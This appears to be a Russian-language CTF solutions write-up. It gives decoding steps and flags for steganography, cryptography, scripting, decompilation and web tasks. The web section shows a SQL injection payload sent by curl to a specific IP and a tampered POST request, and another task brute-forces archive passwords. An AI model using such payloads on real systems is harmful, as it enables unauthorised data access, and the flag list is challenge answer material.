### stegano
#Color
**Zsteg** b1,r,lsb,xy         .. text: "**RTK{c0l0r_r3sp0ns3}**"
#Giraffe
**Strings** **RTK{hungry_g1r4ff3}**
#Landscape
**Exiftool** Comment **RTK{m3t4_s3cr3ts_4r3_3v3rywh3r3}**
#Turtle
binwalk -e Turtle.jpg cat decompressed.bin                                                                     
flag.txt0000664000175000017500000000003215104311211011230 0ustar  useruser **RTK{h1dd3n_turtl3_s0unds}**
#100_pages
PDF to UlRLe3BkZl91X2Nhbl9yMzRkX2l0P30= **RTK{pdf_u_can_r34d_it?}**
#Smoke_On_The_Water
DeepSound **RTK{Fl4g_0n_Th3_W4t3r}**
#Linux_grep
grep -Ril "RTK" .
./folder_pmbymkjcya/folder_cawigcwvgv/folder_ltdayfmktr/folder_fnpfclfyee/whzxrpivpqld.txt
information on the record will last a billion years. Genes and brains and books encode **RTK{gr3p_r3curs10n}**
#Deep_Purple_Marble

### crypto
#This_BASE
UlRLe2I0czM2NF9jNG5faDFkM180bnl0aDFuZ30= base64 RTK{b4s364_c4n_h1d3_4nyth1ng}
#HEXed_Reality
52 54 4b 7b 68 33 78 5f 31 73 5f 63 30 30 6c 7d hex RTK{h3x_1s_c00l}
#Салат_Цезарь 
GIZ{h4a4s_0u_a3ii3gh} ROT11 RTK{s4l4d_0f_l3tt3rs}
#00110000_00110001 
01010010 01010100 01001011 01111011 01100010 00110001 01101110 00110100 01110010 01111001 01011111 01101101 00110100 01100111 00110001 01100011 01111101 bin RTK{b1n4ry_m4g1c}
#Морзянка 
.-. - -.- .--- ..- ... - ..--.- ....- ..--.- -.. ----- - ..--.- ....- -. -.. ..--.- ....- ..--.- -.. ....- ... .... morse 
RTK{JUST_4_D0T_4ND_4_D4SH}
#La_cifra_del_Sig_Giovan_Battista_Bellasо
JXM{j1qid3_z1i3e3v3}  vigenere key secret **RTK{s1mpl3_v1g3n3r3}** 

#Немецкий_шифр
rotate 4
THEMA CHINE LOOKE DLIKE ARTKM INIAT URETY PEWRI TERWI THLIG HTBUL BSAND KEYST HEREW ERERO TATIN GROTO RSINS IDEWH ICHCH ANGED THERE PLACE MENTS CHEME EACHT IMEON ELETT ERHID ACASC ADEOF TRANS FORMA TIONS THATA LMOST NEVER HAPPE NEDTW ICE
“THE MACHINE LOOKED LIKE A MINIATURE TYPEWRITER WITH LIGHT BULBS AND KEYS. THERE WERE ROTATING ROTORS INSIDE WHICH CHANGED THE REPLACEMENT SCHEME EACH TIME ONE LETTER HID A CASCADE OF TRANSFORMATIONS THAT ALMOST NEVER HAPPENED TWICE.”
**RTK{enigma}**
#Rivest-Shamir-Adleman
RSA
c=12444947718261258028419655317632580823404930904036412217397325482827972851976069980732063892582077674733004949143885612685116591302233254162073172783935595515365329900859487106862812679831336241261014732636306145725470681987276293544720463840351427874775130745554545805865324860859124752927246011817988233642729574544340667178518968708035091312663997467327042456845916360978821746717244082103166461452315936018347012181525548387205220360539518237515168642183451117290672225363186922441684876538818406825607380361831868942715636702201083821596052491355974798832396484419937604213226162042344421868918130666254950948630
e=65537
n=17223311486935149764074806330071144300692850120663657131357658596226797882012880655933859590480644691872813634925785500692319498694217539205039337592249022671870753677463012119130238783230275440810729352638370088940549985717970668866554050108346959194319379357028566151083138876598897874162943246607653471459545748646394043849531143902022090809877227294078226481811286379406853606064550960434706785575040633791895031777305432470901251853500111896823598593615945237674242841678222667861174428554427559865172602884815042885310063161459582227651084768332269487438307544215923934415259394509116967223763863852701104767031
p=146423929325679967234414516065661535398432988327486712481604288369757215448400582246058138688460035567679265454288045792775911753639477143527795656672273757339198226776210937638417180501687573388328006125959409846622961002989528045748215455380950217738825569455021972647193213541414194054707681098886880279189
q=117626344042623018880809928493341448044070569347923858567825694552068777986697301045527421570515861484656924846266261041191121462604260136283421841958545658822746686692426232076344786781044346352200885035516960546377493907128989277355484866625717482048050872645634619325702255024819092210854806928150606669979

**RTK{c0mpl3x_4lg0r1thm}**

#JF
Brainfuck **RTK{hello_russki}**

#Python_Lite

```python
cipher_hex = "786e1b2b28ad2835b743d835e2ce67b7228cb7e2d5ceba67ec21"
cipher_bytes = bytes.fromhex(cipher_hex)

inv = 179  # модульная обратная к 123 по mod 256

plain = []
for c in cipher_bytes:
    m = (inv * ((c - 18) % 256)) % 256
    plain.append(m)

flag = bytes(plain).decode('utf-8')
print(flag)  # RTK{baby_Crypto_0N_pYtxon}

```

#Rick_Roll_My_Mind
```python 
import random

# зашифрованная строка (то, что получилось после random.shuffle)
# либо читаем из файла, либо вставляем сюда руками
with open("dop.txt", "r", encoding="utf-8") as f:
    cipher = f.read().strip()


def unshuffle(s: str, seed: int) -> str:
    """
    Обратная операция к random.shuffle по известному seed.
    """
    n = len(s)
    # генерируем ту же самую перестановку, что и при шифровании
    random.seed(seed)
    idx = list(range(n))
    random.shuffle(idx)  # idx[new_pos] = old_pos

    # строим обратную перестановку: old_pos -> new_pos
    inv = [None] * n
    for new_pos, old_pos in enumerate(idx):
        inv[old_pos] = new_pos

    # собираем исходную строку:
    # символ, который был в old_pos, сейчас лежит в позиции inv[old_pos]
    return ''.join(s[inv[i]] for i in range(n))


for seed in range(0, 501):
    plain = unshuffle(cipher, seed)
    # фильтр по формату флага (под CTF: RTK{...})
    if "RTK{" in plain:
        print(f"[+] Найден кандидат! seed = {seed}")
        print(plain) #RTK{n3v3r_G0nn4_g1vE_u_uP_lccc1v} 
```
### PPC

#Archive_N
```sh
for ((i=1000; i>=1; i--)); do
  7z x -p"$i" "archive_${i}.zip"
done
```
**RTK{gpt4o_soc2_VV1N}**
#Archive_memory 
Пароли от архивов это вес вложенного файла **RTK{mem0ry_it_1s_3asy}**
#Базабазабаза
Находи строку и декодируем 
        return base64.b64decode ("UlRLe0cwZF9ENG1uX1RoMXNfQzBkZV9QWUxWTDZ9").decode ("utf-8")
**RTK{G0d_D4mn_Th1s_C0de_PYLVL6}**
#Иллюзия_порядка
```python
import base64

enc_b64 = b'wpjCucKDw4PCrMOMw5XDq8KVd8KJwpXCoMKzwpfCpXrCrMKXwpjCscKww4LDhGjDgw=='
key = "Fe8HXdlx6FT6lT19"

# 1) base64 → байты
cipher_bytes = base64.b64decode(enc_b64)

# 2) байты → UTF-8 строка (как было в encrypt_flag)
cipher_str = cipher_bytes.decode("utf-8")

# 3) обратная операция: (enc - key) mod 256
plain = ''.join(
    chr((ord(c) - ord(key[i % len(key)])) % 256)
    for i, c in enumerate(cipher_str)
)

print(plain)#RTK{This_15_4_fl4G_PYLVL2}

```
#Кодовый_камуфляж
```python
cipher = "][Dt[g;{Px;|P<;:VP_VCYC>r"
key = 15

flag = ''.join(chr(ord(c) ^ key) for c in cipher)
print(flag)  # RTK{Th4t_w4s_345Y_PYLVL1}
```
#Криптовзгляд
```python
#!/usr/bin/env python3
import re
import zlib
import base64
import sys


def peel(code: str, max_layers: int = 50) -> str:
    """
    По шагам снимает слои:
    exec((_)(b'...'))  -> reverse -> base64.b64decode -> zlib.decompress

    Берём ВСЕ совпадения b'...'
    и считаем, что последний байтовый литерал – это полезная нагрузка.
    """
    current = code

    for layer in range(max_layers):
        # Ищем ВСЕ вхождения b'...'
        matches = re.findall(r"b'([^']+)'", current, re.S)
        if not matches:
            # Больше нет слоёв
            print(f"[+] Слои закончились на уровне {layer}", file=sys.stderr)
            break

        payload_b64_reversed = matches[-1]   # последний байтовый литерал
        try:
            # Строка была перевёрнута в исходном коде, поэтому разворачиваем
            s = payload_b64_reversed[::-1]

            # Декодируем из base64
            decoded = base64.b64decode(s)

            # Декомпрессия zlib
            decompressed = zlib.decompress(decoded)

            # Переходим к следующему слою как к обычному тексту
            current = decompressed.decode('utf-8', errors='replace')

            print(f"[+] Успешно снят слой {layer}, длина кода: {len(current)}", file=sys.stderr)
        except Exception as e:
            print(f"[!] Ошибка на слое {layer}: {e}", file=sys.stderr)
            break

    return current


def main():
    if len(sys.argv) < 2:
        print(f"Использование: {sys.argv[0]} <путь_к_файлу.py>", file=sys.stderr)
        sys.exit(1)

    path = sys.argv[1]

    with open(path, "r", encoding="utf-8") as f:
        code = f.read()

    final_code = peel(code)
    print(final_code)


if __name__ == "__main__":
    main()

#def flag(password):
#    if password == "ZXserSDFERwfdS41rt43":
#        return "your flag is RTK{Th1s_w4s_n0t_FuNny_PYLVL5}"
#    else:
#        return "wrong password!"
```

#Путаница_в_простом
```python
import base64, codecs

magic = 'ZGVmIGZsYWcocGFzc3dvcmQpOg0KICAgIGlmIHBhc3N3b3JkID09ICJTRGZ2bDE2NlhWe'
love = 'GN2c2QyMzR2IjoNCiAgICAgICAgcmV0dXJuICJ5b3VyIGZsYWcgaXMgUlRLe0QzNERfQz'
god = 'BEM19sbWFvX1BZTFZMNH0iDQogICAgZWxzZToNCiAgICAgICAgcmV0dXJuICJ3cm9uZyB'      
destiny = 'wYXNzd29yZCEiDQoNCmlucCA9IGlucHV0ICgiUGFzc3dvcmQ6ICIpDQpwcmludChmbGFnKGlucCkp'
s = magic + love + god + destiny
decoded = base64.b64decode(s).decode()
print(decoded)
#def flag(password):
#    if password == "SDfvl166XVxcvsd234v":
#        return "your flag is RTK{D34D_C0D3_lmao_PYLVL4}"
#    else:
#        return "wrong password!"
#
#inp = input ("Password: ")
#print(flag(inp))

```
#Шифр_Минотавра
```python
import base64

cipher_b64 = b'MCI5w4cSPnMfBcODw5EdEgjDqFsKw7seNMOjPRI/Ol4Qf8K7'
key = "SvXGILFVaAZoi5m6uqfDgPBTv8qG3mFH"
random_shift = 12

encrypted = base64.b64decode(cipher_b64).decode('utf-8')

flag_chars = []
key_len = len(key)

for i, ch in enumerate(encrypted):
    C = ord(ch)
    K = ord(key[i % key_len])
    s = (K + random_shift) % 26
    P_code = (C ^ K) - s
    flag_chars.append(chr(P_code))

flag = "".join(flag_chars)
print(flag)# RTK{Th15_is_n0t_funny_PYLVL3}

```

### REV
#Декомпиляция_уровень_новичок
./pycdc ~/Загрузки/decompilation_beginner_level.pyc > 10_pycdc.py
```python
# Source Generated with Decompyle++
# File: decompilation_beginner_level.pyc (Python 3.13)

message = '72746b7b70797468306e5f643363306d70696c335f7434736b7d'
flag = None('Enter flag: ')
None('Press Enter to exit...')
#rtk{pyth0n_d3c0mpil3_t4sk}
```
### web
#От_себя_не_убежишь
```js
function _0x4c46() {
    const _0x1815ad = [
        'appendChil','stener','position','CIEaC','top','absolute',
        'textConten','ent','none','white','fontSize','createElem','green',
        'touchstart','kutoo','UlRLe2sxc3','2rem','tabIndex','25%','mouseover',
        '2763915DQpehO','EiPcv','1rem','2378355KxkgxQ','4955220AkFfoI','aKqoj',
        'style','click','YTNAo','332721wVtfNO','color','прещены!','7361487vySgWc',
        'background','XfLVr','2912476HqGrWa','Касания за','NfeTB1clNl',
        '1322804yquCRw','padding','body','Arial','border','NmETL','accept',
        'borderRadi','left','fontFamily','div','addEventLi','bGZ9','Color','15px'
    ];
    _0x4c46 = function(){ return _0x1815ad; };
    return _0x4c46();
}
//Функция `_0x4b98` берёт элемент этого массива по индексу, но индекс сначала смещается на константу (124):
_0x198a41 = _0x198a41 - 124;
return _0x1f0c57[_0x198a41];
//Дальше идёт типичный обфускаторский блок с `while(!![])`, который крутит массив (`shift` + `push`), пока вот это выражение:
const _0x11e55d =
  parseInt(_0xff2e35(0x7c))/... +
  parseInt(_0xff2e35(0x85))/... +
  ...
//не станет равно константе:
0x6564d + -0x3cff7 + -0xfa51 * -0x5 // = 485867
//В итоге массив поворачивается на 29 позиций, и уже в этом окончательном состоянии рассчитывается `flag`.
const flag = _0x1c1c4d(0xa3) + _0x1c1c4d(0x84) + _0x1c1c4d(0x91);
flag = "UlRLe2sxc3" + "NfeTB1clNl" + "bGZ9";
// "UlRLe2sxc3NfeTB1clNlbGZ9"
//Раскодируем base64:
UlRLe2sxc3NfeTB1clNlbGZ9  →  RTK{k1ss_y0urSelf}

```
#Скрытое_за_кулисами
f12 > network f5
RTK{HtTpRequests_aNd_aRe_uSefuL}
#Экзамен_по_математике
```python
import requests

BASE_URL = "http://77.232.44.12:8001/submit_answer"

payload = {
    "count": 5555,  # именно 5555
    "problem": "2 + 2",
    "answer": "4"
}

r = requests.post(BASE_URL, json=payload)
print(r.text)
#{"success":true,"problem":"Ваша оценка: RTK{0tseNKaPya@tt}"}%                   
```

#Список_пользователей
```sh
curl 'http://77.232.44.12:8002/get_user?username=%27%20OR%201=1%20--'
#[["Admin","RTK{Sq"],["Дед мороз","l_1N"],["Граф Дракула","jEC"],["Anonymous User 1","ti0nS_"],["Anonymous User 45","_"],["fhjhjfyh","are_"],["xx123","c0oL"],["User","11}"]]
#RTK{Sql_1NjECti0nS__are_c0oL11}

```